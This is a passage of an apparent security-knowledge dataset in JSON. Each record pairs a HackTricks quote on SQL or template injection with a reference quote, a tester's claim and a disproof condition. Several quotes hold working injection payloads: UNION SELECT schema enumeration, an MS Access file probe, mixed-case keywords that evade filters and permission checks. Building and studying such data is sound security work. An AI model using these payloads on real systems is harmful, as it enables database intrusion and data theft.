+  "QUOTE_VERBATIM": "0 UNION SELECT * FROM flag\n\nIt’s possible to access the third column of a table without using its name using a query like the following:",
+  "class_terms_in_quote": [
+   "select ",
+   "union select"
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://cwe.mitre.org/data/definitions/89.html",
+  "partner_org": "mitre.org",
+  "partner_quote_already_verified": "For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.",
+  "claim": "Once a UNION SELECT column count is aligned, the tester can read a chosen position out of a table with a wildcard select and never has to know the column's name, which is how data leaves the database once the injection point is confirmed.",
+  "disproof": "A wildcard select that returns nothing from a table known to be readable, or one that fails purely on a column-count mismatch, refutes the positional-access claim."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "test",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/ms-access-sql-injection.md",
+  "hacktricks_page": "pentesting-web/sql-injection/ms-access-sql-injection.md",
+  "page_title": "MS Access SQL Injection",
+  "QUOTE_VERBATIM": "If the specified file exists, MS Access triggers an error message indicating that the database format is invalid:<sup>[[1]](#references)</sup>\n\nhttp://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\\boot.ini'%00\n\nAnother way to enumerate files consists into specifying a database.table item.",
+  "class_terms_in_quote": [
+   "database",
+   "select ",
+   "union select"
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://sqlite.org/lang_expr.html",
+  "partner_org": "sqlite.org",
+  "partner_quote_already_verified": "A \"variable\" or \"parameter\" token specifies a placeholder in the expression for a value that is filled in at runtime using the sqlite3_bind() family of C/C++ interfaces.",
+  "claim": "MS Access hands the tester a file-existence oracle from inside the injection: point the database reference at a local file and the invalid-database-format error appears only when that file is really there, so file enumeration is driven by comparing errors across candidate paths.",
+  "disproof": "The invalid-format error appearing identically for names that do not exist, or never appearing for one that does, refutes the existence oracle."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/ms-access-sql-injection.md",
+  "hacktricks_page": "pentesting-web/sql-injection/ms-access-sql-injection.md",
+  "page_title": "MS Access SQL Injection",
+  "QUOTE_VERBATIM": "TOP accepts as argument an integer, representing the number of rows to be returned.\n\nsql\n1' UNION SELECT TOP 3 attr FROM table%00\n\n\nJust like TOP you can use LAST which will get the rows from the end.",
+  "class_terms_in_quote": [
+   "select ",
+   "union select"
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://sqlite.org/lang_expr.html",
+  "partner_org": "sqlite.org",
+  "partner_quote_already_verified": "A \"variable\" or \"parameter\" token specifies a placeholder in the expression for a value that is filled in at runtime using the sqlite3_bind() family of C/C++ interfaces.",
+  "claim": "Inside an injected MS Access query, TOP and LAST act as row selectors, so the tester can cap or reverse the result set and page out a table's records instead of dumping it whole.",
+  "disproof": "TOP or LAST modifiers rejected as syntax by the same injection point, or accepted but leaving the returned rows unchanged, refute their use as row-selection controls."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "prerequisite",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/ms-access-sql-injection.md",
+  "hacktricks_page": "pentesting-web/sql-injection/ms-access-sql-injection.md",
+  "page_title": "MS Access SQL Injection",
+  "QUOTE_VERBATIM": "Imagine that you have SQL injection in an MS Access database and know or have guessed a column named username.",
+  "class_terms_in_quote": [
+   "database",
+   "sql injection"
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://sqlite.org/lang_expr.html",
+  "partner_org": "sqlite.org",
+  "partner_quote_already_verified": "A \"variable\" or \"parameter\" token specifies a placeholder in the expression for a value that is filled in at runtime using the sqlite3_bind() family of C/C++ interfaces.",
+  "claim": "Extraction on MS Access is gated on naming a real column such as username, so the guess-and-check step on column names comes before any value can be pulled out of the database through the injection.",
+  "disproof": "Reading a value out of MS Access with no valid column name in the injected query, or a fabricated column name returning data, refutes this ordering."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/mssql-injection.md",
+  "hacktricks_page": "pentesting-web/sql-injection/mssql-injection.md",
+  "page_title": "MSSQL Injection",
+  "QUOTE_VERBATIM": "Here's how to retrieve the schema, tables, and columns from the current database:\n\nsql\nhttps://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--\nIn situations where error-based vectors are used, it's crucial to provide an alias or a name.",
+  "class_terms_in_quote": [
+   " where ",
+   "database",
+   "select ",
+   "union select"
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://portswigger.net/web-security/sql-injection",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters",
+  "claim": "On MSSQL a single injected UNION SELECT over information_schema.columns hands back the schema, table and column names of the current database at once, and on error-based vectors every selected expression has to carry an alias or the query will not come back.",
+  "disproof": "An error-based injected select that errors purely because an expression lacks an alias, or a schema enumeration that returns no rows despite a working injection point, refutes these requirements."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/mssql-injection.md",
+  "hacktricks_page": "pentesting-web/sql-injection/mssql-injection.md",
+  "page_title": "MSSQL Injection",
+  "QUOTE_VERBATIM": "SELECT * FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name='VIEW DATABASE PERFORMANCE STATE';",
+  "class_terms_in_quote": [
+   " where ",
+   "database",
+   "select "
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://portswigger.net/web-security/sql-injection",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters",
+  "claim": "An MSSQL injection point doubles as a privilege-reach probe: calling fn_my_permissions against the database and filtering on a named permission tells the tester which database-level grants the injected session actually holds before they plan any escalation.",
+  "disproof": "fn_my_permissions returning no rows, or an empty grant set, for a login that demonstrably holds the named database permission refutes it as a reach check."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "test",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/mssql-injection.md",
+  "hacktricks_page": "pentesting-web/sql-injection/mssql-injection.md",
+  "page_title": "MSSQL Injection",
+  "QUOTE_VERBATIM": "The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:\n\nsql\nhttps://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null\n\n\nTo check if you have the VIEW SERVER STATE permission, the following query can be used:\n\nsql\nSELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';",
+  "class_terms_in_quote": [
+   " where ",
+   "select ",
+   "sql query"
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://portswigger.net/web-security/sql-injection",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters",
+  "claim": "On MSSQL the tester can read the live query text back through sys.dm_exec_requests joined to sys.dm_exec_sql_text, which is the way to confirm the injection really landed in the query and to see the surrounding SQL, with the server-level permission checked separately.",
+  "disproof": "The DMVs returning nothing, or returning a query that does not contain the injected syntax, refutes their use for reading back the currently executing SQL query."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/mysql-injection/README.md",
+  "hacktricks_page": "pentesting-web/sql-injection/mysql-injection/README.md",
+  "page_title": "MySQL injection",
+  "QUOTE_VERBATIM": "MySQL Union Based\n\nsql\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...",
+  "class_terms_in_quote": [
+   " where ",
+   "select ",
+   "union select"
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+  "partner_org": "owasp.org",
+  "partner_quote_already_verified": "If you are faced with parts of SQL queries that can't use bind variables, such as table names, column names, or sort order indicators (ASC or DESC)",
+  "claim": "MySQL schema and table names come out of a UNION SELECT with GROUP_CONCAT over information_schema, and the alternating letter case of the quoted keywords is the point: the enumeration has to be sent in mixed case so a filter matching keywords in one fixed case does not stop it.",
+  "disproof": "A filter that blocks the mixed-case spelling while letting the all-lowercase form through, or a UNION SELECT that returns no schema rows despite a working injection point, refutes this enumeration route."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/mysql-injection/README.md",
+  "hacktricks_page": "pentesting-web/sql-injection/mysql-injection/README.md",
+  "page_title": "MySQL injection",
+  "QUOTE_VERBATIM": "UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...",
+  "class_terms_in_quote": [
+   " where ",
+   "select ",
+   "union select"
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+  "partner_org": "owasp.org",
+  "partner_quote_already_verified": "If you are faced with parts of SQL queries that can't use bind variables, such as table names, column names, or sort order indicators (ASC or DESC)",
+  "claim": "Naming a target table turns the same UNION SELECT pattern into a column dictionary, so the tester moves from which tables exist to exactly which attributes the injected query can reference.",
+  "disproof": "The column enumeration coming back empty for a table that the same injection point can already read rows from refutes this metadata route."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "variant",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/mysql-injection/README.md",
+  "hacktricks_page": "pentesting-web/sql-injection/mysql-injection/README.md",
+  "page_title": "MySQL injection",
+  "QUOTE_VERBATIM": "Example query built by the backend:\n\nsql\nSELECT tid, firstpost\nFROM threads\nWHERE MATCH(subject) AGAINST('+jack*' IN BOOLEAN MODE);",
+  "class_terms_in_quote": [
+   " where ",
+   "select "
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+  "partner_org": "owasp.org",
+  "partner_quote_already_verified": "If you are faced with parts of SQL queries that can't use bind variables, such as table names, column names, or sort order indicators (ASC or DESC)",
+  "claim": "A search box wired into a full-text MATCH ... AGAINST clause in boolean mode is its own injection flavour: the search term is concatenated inside the quoted argument, so the tester should probe the quote and the boolean-mode operators rather than a plain WHERE value.",
+  "disproof": "A search parameter concatenated into that MATCH clause that can neither break out of the quotes nor change the boolean-mode search, refutes it as an injection point."
+ },
+ {
+  "class_id": "ssti",
+  "kind": "impact",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/client-side-template-injection-csti.md",
+  "hacktricks_page": "pentesting-web/client-side-template-injection-csti.md",
+  "page_title": "Client Side Template Injection (CSTI)",
+  "QUOTE_VERBATIM": "The SSTI can allow you to execute code on the remote server, the CSTI could allow you to execute arbitrary JavaScript code in the victim's browser.",
+  "class_terms_in_quote": [
+   "ssti"
+  ],
+  "class_vocabulary": [
+   "jinja",
+   "server-side template",
+   "ssti",
+   "template engine",
+   "template injection",
+   "twig"
+  ],
+  "partner_url": "https://snyk.io/blog/thymeleaf-injection/",
+  "partner_org": "snyk.io",
+  "partner_quote_already_verified": "The vulnerability becomes exploitable when a developer allows user input to reach the expression engine directly. If this occurs, it indicates the developer is misusing the framework.",
+  "claim": "Where the template is evaluated decides the ceiling of the finding: a client-side injection buys arbitrary JavaScript in the victim's browser, not code execution on the remote server, so the two must not be reported with the same severity.",
+  "disproof": "A client-side template injection that yields code execution on the remote server, or that produces no JavaScript execution in the victim's browser at all, refutes this impact boundary."
+ },
+ {
+  "class_id": "ssti",
+  "kind": "test",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/client-side-template-injection-csti.md",
+  "hacktricks_page": "pentesting-web/client-side-template-injection-csti.md",
+  "page_title": "Client Side Template Injection (CSTI)",
+  "QUOTE_VERBATIM": "Testing for this vulnerability is very similar as in the case of SSTI, the interpreter expects a template and will execute it.",
+  "class_terms_in_quote": [
+   "ssti"
+  ],
+  "class_vocabulary": [
+   "jinja",
+   "server-side template",
+   "ssti",
+   "template engine",
+   "template injection",
+   "twig"
+  ],
+  "partner_url": "https://snyk.io/blog/thymeleaf-injection/",
+  "partner_org": "snyk.io",
+  "partner_quote_already_verified": "The vulnerability becomes exploitable when a developer allows user input to reach the expression engine directly. If this occurs, it indicates the developer is misusing the framework.",
+  "claim": "The same template payloads used to prove server-side template injection are the right probe for the client-side case, because the client interpreter also expects a template and executes whatever it is handed; a field that renders template syntax as literal text is a clean negative.",
+  "disproof": "Template payloads that render as inert literal text in the client interpreter, or a server-side payload whose result differs from the client-side one on identical input, refutes the equivalence."
+ },
+ {
+  "class_id": "ssti",
+  "kind": "signal",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/ssti-server-side-template-injection/README.md",
+  "hacktricks_page": "pentesting-web/ssti-server-side-template-injection/README.md",
+  "page_title": "SSTI (Server Side Template Injection)",
+  "QUOTE_VERBATIM": "This can potentially allow an attacker to inject malicious code into the name parameter, leading to server-side template injection.",
+  "class_terms_in_quote": [
+   "server-side template",
+   "template injection"
+  ],
+  "class_vocabulary": [
+   "jinja",
+   "server-side template",
+   "ssti",
+   "template engine",
+   "template injection",
+   "twig"
+  ],
+  "partner_url": "https://jinja.palletsprojects.com/en/stable/sandbox/",
+  "partner_org": "palletsprojects.com",
+  "partner_quote_already_verified": "It is possible to construct a relatively small template that renders to a very large amount of output, which could correspond to a high use of CPU or memory.",
+  "claim": "An ordinary profile field such as a name parameter is the signal worth chasing, not an exotic input: any value that the server-side template engine renders back is a candidate injection point because the engine will interpret whatever the user put there.",
+  "disproof": "A name parameter whose template metacharacters are stripped or escaped before rendering and come back as literal text, refutes it as an injection point."
+ },
+ {
+  "class_id": "ssti",
+  "kind": "impact",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/ssti-server-side-template-injection/README.md",
+  "hacktricks_page": "pentesting-web/ssti-server-side-template-injection/README.md",
+  "page_title": "SSTI (Server Side Template Injection)",
+  "QUOTE_VERBATIM": "This payload can contain Jinja template directives that enable the attacker to execute unauthorized code or manipulate the template engine, potentially gaining control over the server.",
+  "class_terms_in_quote": [
+   "jinja",
+   "template engine"
+  ],
+  "class_vocabulary": [
+   "jinja",
+   "server-side template",
+   "ssti",
+   "template engine",
+   "template injection",
+   "twig"
+  ],
+  "partner_url": "https://jinja.palletsprojects.com/en/stable/sandbox/",
+  "partner_org": "palletsprojects.com",
+  "partner_quote_already_verified": "It is possible to construct a relatively small template that renders to a very large amount of output, which could correspond to a high use of CPU or memory.",
+  "claim": "With Jinja as the engine, it is the Jinja directives inside the injected template that turn template injection into code execution and control of the engine itself, so identifying the engine decides what the finding is worth.",
+  "disproof": "Jinja syntax injected into a template that renders as literal text with no directive evaluated and no code execution, refutes this mechanism."
+ },
+ {
+  "class_id": "ssti",
+  "kind": "test",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/ssti-server-side-template-injection/README.md",
+  "hacktricks_page": "pentesting-web/ssti-server-side-template-injection/README.md",
+  "page_title": "SSTI (Server Side Template Injection)",
+  "QUOTE_VERBATIM": "To prevent server-side template injection vulnerabilities, developers should ensure that user input is properly sanitized and validated before being inserted into templates.",
+  "class_terms_in_quote": [
+   "server-side template",
+   "template injection"
+  ],
+  "class_vocabulary": [
+   "jinja",
+   "server-side template",
+   "ssti",
+   "template engine",
+   "template injection",
+   "twig"
+  ],
+  "partner_url": "https://jinja.palletsprojects.com/en/stable/sandbox/",
+  "partner_org": "palletsprojects.com",
+  "partner_quote_already_verified": "It is possible to construct a relatively small template that renders to a very large amount of output, which could correspond to a high use of CPU or memory.",
+  "claim": "The whole defence for server-side template injection sits at one boundary, the insertion of user input into the template, so that is the only place worth verifying rather than trusting escaping applied somewhere else in the flow.",
+  "disproof": "Template syntax surviving insertion into the template and being evaluated by the engine refutes sanitization and validation happening at that insertion point."
+ }
+]
